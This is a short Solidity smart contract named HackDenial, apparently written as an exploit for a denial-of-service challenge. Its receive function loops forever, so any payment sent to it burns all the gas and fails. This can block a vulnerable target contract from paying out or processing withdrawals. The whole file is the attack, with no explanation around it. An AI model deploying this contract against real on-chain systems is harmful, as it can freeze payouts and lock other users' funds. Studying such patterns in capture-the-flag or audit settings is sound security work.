// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackDenial {
    receive() external payable {
        while(true){
            continue;
        }
    }

}